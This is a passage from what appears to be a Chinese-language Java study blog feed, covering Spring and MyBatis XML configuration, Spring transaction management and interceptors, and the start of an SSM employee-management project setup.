class="name">includes</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--指定jdk的版本--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Spring配置文件</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">   把数据库的配置信息，写在一个独立的文件，编译修改数据库的配置内容</span></span><br><span class="line"><span class="comment">   spring知道jdbc.properties文件的位置</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--声明数据源DataSource, 作用是连接数据库的--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myDataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">init-method</span>=<span class="string">&quot;init&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;close&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--set注入给DruidDataSource提供连接数据库信息 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--    使用属性配置文件中的数据，语法 $&#123;key&#125; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span> /&gt;</span><span class="comment">&lt;!--setUrl()--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.passwd&#125;&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;maxActive&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.max&#125;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--声明的是mybatis中提供的SqlSessionFactoryBean类，这个类内部创建SqlSessionFactory的</span></span><br><span class="line"><span class="comment">    SqlSessionFactory  sqlSessionFactory = new ..</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--set注入，把数据库连接池付给了dataSource属性--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;myDataSource&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--mybatis主配置文件的位置</span></span><br><span class="line"><span class="comment">       configLocation属性是Resource类型，读取配置文件</span></span><br><span class="line"><span class="comment">       它的赋值，使用value，指定文件的路径，使用classpath:表示文件的位置</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:mybatis.xml&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--创建dao对象，使用SqlSession的getMapper（StudentDao.class）</span></span><br><span class="line"><span class="comment">    MapperScannerConfigurer:在内部调用getMapper()生成每个dao接口的代理对象。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--指定SqlSessionFactory对象的id--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sqlSessionFactoryBeanName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--指定包名， 包名是dao接口所在的包名。</span></span><br><span class="line"><span class="comment">        MapperScannerConfigurer会扫描这个包中的所有接口，把每个接口都执行</span></span><br><span class="line"><span class="comment">        一次getMapper()方法，得到每个接口的dao对象。</span></span><br><span class="line"><span class="comment">        创建好的dao对象放入到spring的容器中的。 dao对象的默认名称是 接口名首字母小写</span></span><br><span class="line"><span class="comment">    --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;basePackage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.bjpowernode.dao&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--声明service--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentService&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.bjpowernode.service.impl.StudentServiceImpl&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;studentDao&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;studentDao&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Spring事务处理"><a href="#Spring事务处理" class="headerlink" title="Spring事务处理"></a>Spring事务处理</h2><p><strong>处理事务，需要怎么做，做什么</strong><br>  spring处理事务的模型，使用的步骤都是固定的。把事务使用的信息提供给spring就可以了</p><p>  1）事务内部提交，回滚事务，使用的事务管理器对象，代替你完成commit，rollback<br>     事务管理器是一个接口和他的众多实现类。<br>      接口：PlatformTransactionManager ，定义了事务重要方法 commit ，rollback<br>      实现类：spring把每一种数据库访问技术对应的事务处理类都创建好了。<br>               mybatis访问数据库—spring创建好的是DataSourceTransactionManager<br>                  hibernate访问数据库—-spring创建的是HibernateTransactionManager</p><p>怎么使用：你需要告诉spring 你用是那种数据库的访问技术，怎么告诉spring呢？<br>      声明数据库访问技术对于的事务管理器实现类， 在spring的配置文件中使用<bean>声明就可以了<br>      例如，你要使用mybatis访问数据库，你应该在xml配置文件中<br>      &lt;bean id&#x3D;“xxx” class&#x3D;”…DataSourceTransactionManager”&gt; </p><p>  2）你的业务方法需要什么样的事务，说明需要事务的类型。<br>     说明方法需要的事务：</p><ol><li><p>事务的隔离级别：有4个值。<br>DEFAULT：采用 DB 默认的事务隔离级别。MySql 的默认为 REPEATABLE_READ； Oracle默认为 READ_COMMITTED。<br>➢ READ_UNCOMMITTED：读未提交。未解决任何并发问题。<br>➢ READ_COMMITTED：读已提交。解决脏读，存在不可重复读与幻读。<br>➢ REPEATABLE_READ：可重复读。解决脏读、不可重复读，存在幻读<br>➢ SERIALIZABLE：串行化。不存在并发问题。</p></li><li><p>事务的超时时间： 表示一个方法最长的执行时间，如果方法执行时超过了时间，事务就回滚。<br>  单位是秒， 整数值， 默认是 -1. </p></li><li><p>事务的传播行为 ： 控制业务方法是不是有事务的， 是什么样的事务的。<br>     7个传播行为，表示你的业务方法调用时，事务在方法之间是如果使用的。<br>     PROPAGATION_REQUIRED<br>     PROPAGATION_REQUIRES_NEW<br>     PROPAGATION_SUPPORTS<br>     以上三个需要掌握<br>     PROPAGATION_MANDATORY<br>     PROPAGATION_NESTED<br>     PROPAGATION_NEVER<br>     PROPAGATION_NOT_SUPPORTED</p></li></ol><p>  3）事务提交事务，回滚事务的时机</p><ol><li><p>当你的业务方法，执行成功，没有异常抛出，当方法执行完毕，spring在方法执行后提交事务。事务管理器commit</p></li><li><p>当你的业务方法抛出运行时异常或ERROR， spring执行回滚，调用事务管理器的rollback<br>  运行时异常的定义： RuntimeException  和他的子类都是运行时异常， 例如NullPointException , NumberFormatException</p></li><li><p>当你的业务方法抛出非运行时异常， 主要是受查异常时，提交事务<br> 受查异常：在你写代码中，必须处理的异常。例如IOException, SQLException</p></li></ol><h3 id="总结spring的事务"><a href="#总结spring的事务" class="headerlink" title="总结spring的事务"></a>总结spring的事务</h3><p>  1.管理事务的是 事务管理和他的实现类<br>  2.spring的事务是一个统一模型<br>     1) 指定要使用的事务管理器实现类，使用<bean><br>    2) 指定哪些类，哪些方法需要加入事务的功能<br>      3) 指定方法需要的隔离级别，传播行为，超时</p><p>你需要告诉spring，你的项目中类信息，方法的名称，方法的事务传播行为。</p><p>spring框架中提供的事务处理方案<br>1.适合中小项目使用的注解方案。<br>  spring框架自己用aop实现给业务方法增加事务的功能， 使用@Transactional注解增加事务。<br>  @Transactional注解是spring框架自己注解，放在public方法的上面，表示当前方法具有事务。<br>  可以给注解的属性赋值，表示具体的隔离级别，传播行为，异常信息等等</p><p>  使用@Transactional的步骤：</p><ol><li><p>需要声明事务管理器对象<br><bean id="xx" class="DataSourceTransactionManager"></p></li><li><p>开启事务注解驱动， 告诉spring框架，我要使用注解的方式管理事务。<br>spring使用aop机制，创建@Transactional所在的类代理对象，给方法加入事务的功能。<br>spring给业务方法加入事务：<br>   在你的业务方法执行之前，先开启事务，在业务方法之后提交或回滚事务，使用aop的环绕通知</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Around(&quot;你要增加的事务功能的业务方法名称&quot;)</span></span><br><span class="line">Object <span class="title function_">myAround</span><span class="params">()</span>&#123;</span><br><span class="line">          开启事务，spring给你开启</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">buy(<span class="number">1001</span>,<span class="number">10</span>);</span><br><span class="line">spring的事务管理器.commit();</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            spring的事务管理器.rollback();</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在你的方法的上面加入@Trancational</p></li></ol><p>2.适合大型项目，有很多的类，方法，需要大量的配置事务，使用aspectj框架功能，在spring配置文件中声明类，方法需要的事务。这种方式业务方法和事务配置完全分离。</p><p>  实现步骤： 都是在xml配置文件中实现。<br>   1)要使用的是aspectj框架，需要加入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2）声明事务管理器对象</p><p>   &lt;bean id&#x3D;”xx” class&#x3D;”DataSourceTransactionManager”&gt;</p><p>3）声明方法需要的事务类型（配置方法的事务属性【隔离级别，传播行为，超时】）</p><p>4）配置aop：指定哪些哪类要创建代理。</p><h2 id="Spring-拦截器"><a href="#Spring-拦截器" class="headerlink" title="Spring 拦截器"></a>Spring 拦截器</h2><p>Spring框架拦截器（Interceptor）介绍</p><p>在Spring框架中，拦截器是一种强大的机制，用于处理Web应用程序中请求和响应的预处理和后处理。它们允许开发人员在请求到达控制器之前或响应返回给客户端之前干预和修改请求和响应。</p><p>拦截器是基于面向切面编程（AOP）的原则实现的，它可以实现与业务逻辑无关的通用功能，例如身份验证、日志记录、异常处理等。通过使用拦截器，我们可以将这些通用功能从业务逻辑代码中分离出来，提高代码的可重用性和可维护性。</p><p>Spring框架中的拦截器通过实现HandlerInterceptor接口来定义，并且可以通过配置文件或注解的方式将其应用到特定的处理器或URL上。</p><p>拦截器提供了以下三个方法，允许我们在请求处理的不同阶段进行操作：</p><ol><li>preHandle：在请求到达目标控制器之前被调用，允许对请求进行修改或校验，还可以决定是否继续执行请求处理链。</li><li>postHandle：在目标控制器执行之后，但在响应返回给客户端之前调用，允许对模型和视图进行修改。</li><li>afterCompletion：在响应返回给客户端之后调用，允许进行一些清理工作。</li></ol><p>拦截器可以用于各种场景，包括：</p><ol><li>身份验证和权限控制：检查用户是否已登录或具有特定的角色或权限。</li><li>日志记录：记录请求和响应的详细信息，以便进行故障排除或性能分析。</li><li>异常处理：捕获和处理控制器中抛出的异常，并根据需要进行适当的操作。</li><li>缓存管理：在对请求进行处理之前，从缓存中获取相应的数据，以提高性能等。</li></ol><p>总结而言，Spring框架拦截器是一种强大的机制，用于在请求到达控制器之前和响应返回给客户端之前对请求和响应进行预处理和后处理。它们提供了一种可重用且独立于业务逻辑的方式来实现通用功能，并提高代码的可维护性和可测试性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheduler.schedule(this::enableAIService, idleTimeThreshold, TimeUnit.MILLISECONDS);</span><br></pre></td></tr></table></figure><p>这行代码是用来调度在空闲时间阈值之后启用AI服务的功能。它使用一个调度器（scheduler）来执行一个任务（this::enableAIService），任务将在指定的空闲时间阈值之后执行，单位为毫秒（TimeUnit.MILLISECONDS）。通过调度器，可以控制AI服务何时被启用。</p>]]></content>
    
    
    <categories>
      
      <category>java学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>企业员工管理系统</title>
    <link href="/2023/06/18/%E4%BC%81%E4%B8%9A%E5%91%98%E5%B7%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/06/18/%E4%BC%81%E4%B8%9A%E5%91%98%E5%B7%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>学习完 Mybatis Spring SpringMVC 三大框架后进行的项目整合练习，通过实践发现自己在学习的过程中存在的问题。<br>这个项目采用SSM框架，前端采用http标签简单处理（用jsp写的），主要在于后端框架的整合开发</p><h1 id="项目开发"><a href="#项目开发" class="headerlink" title="项目开发"></a>项目开发</h1><h2 id="搭建开发环境"><a href="#搭建开发环境" class="headerlink" title="搭建开发环境"></a>搭建开发环境</h2><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><p>首先配置 pom.xml 文件，添加相关依赖<br>这一步直接搬运的别人的依赖，其中配置了</p><table><thead><tr><th>配置</th><th>介绍</th></tr></thead><tbody><tr><td>spring</td><td>Spring相关包</td></tr><tr><td>javax.servlet</td><td>servlet和jsp依赖</td></tr><tr><td>jstl</td><td>JSP标准标签库</td></tr><tr><td>mybatis</td><td>Mybatis相关依赖</td></tr><tr><td>mysql.connector.java</td><td>Mysql的JDBC驱动包</td></tr><tr><td>druid</td><td>阿里开源数据库连接池</td></tr><tr><td>mybatis.spring</td><td>将Mybatis无缝整合到Spring中</td></tr><tr><td>slf4j</td><td>为Java提供简单日志</td></tr><tr><td>log4j</td><td>具体的日志系统</td></tr><tr><td>junit</td><td>Java单元测试框架</td></tr><tr><td>jackson</td><td>序列化和反序列化 json 的 Java 的开源框架</td></tr></tbody></table><p>配置完pom.xml后可以使用maven helper插件检查依赖冲突</p><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><p>然后再到web-inf目录下重新创建 web.xml 文件<br>在该文件下注册ContextLoaderListener监听器，我在搭建的时候就是因为忘了添加这个监听器导致启动Tomcat就会报错。该监听器作用是启动Web容器时，自动装配ApplicationContext的配置信息。用于创建 Spring 容器及将创建好的 Spring 容器对象放入到 ServletContext 的作用域中。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--整个项目的全局变量，param-name是键，param-value是值--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!--注册SpringMVC框架--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--DispatcherServlet是前置控制器，主要拦截匹配的请求，把拦截下来的请求根据规则分发到目标Controller来处理--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--整个项目的局部变量，只能在当前Servlet中被使用--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:springmvc.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--表示容器启动时初始化该Servlet,1表示优先级--&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--声明与该Servlet相应的匹配规则，url-pattern代表一个匹配规则--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springmvc<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="applicationContext-xml"><a href="#applicationContext-xml" class="headerlink" title="applicationContext.xml"></a>applicationContext.xml</h3><p>之后在resources目录下创建applicationContext.xml文件和springmvc.xml配置文件<br>applicationContext.xml文件下添加如下标签，该注解的作用是扫描base-package包和子包下所有的Java类，并把匹配的Java类注册成Bean</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.hukaichao&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--1.配置数据库相关参数--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">&quot;classpath:jdbc.properties&quot;</span> <span class="attr">ignore-unresolvable</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--2.数据源 druid --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.alibaba.druid.pool.DruidDataSource&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;init&quot;</span> <span class="attr">destroy-method</span>=<span class="string">&quot;close&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.driverClassName&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.url&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.username&#125;&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;jdbc.password&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--3、配置SqlSessionFactory对象 创建Session工厂--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--注入数据库连接池--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--扫描sql配置文件:mapper需要的xml文件--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mapperLocations&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:mapper/*.xml&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--SqlSessionTemplate是用来代替默认Mybatis实现的DefaultSqlSessionFactory，也可以说是DefaultSqlSessionFactory的优化版--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSession&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionTemplate&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;sqlSessionFactory&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 扫描basePackage下所有以@MyBatisDao注解的接口</span></span><br><span class="line"><span class="comment">MapperScannerConfigurer类会查找路径下的映射器并将它们创建成MapperFactoryBean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;mapperScannerConfigurer&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sqlSessionFactoryBeanName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sqlSessionFactory&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;basePackage&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.hukaichao.dao&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="jdbc-properties"><a href="#jdbc-properties" class="headerlink" title="jdbc.properties"></a>jdbc.properties</h3><p>其中 serverTimezone 和 useSSL&#x3D;false 是一定要的，前者是设置时区，新版的MySQL中不设置时区将无法启动；后者不配置的话，对数据库进行操作的时候会报出警告并一直卡在那里无法进行下一步</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">jdbc.driverClassName</span>=<span 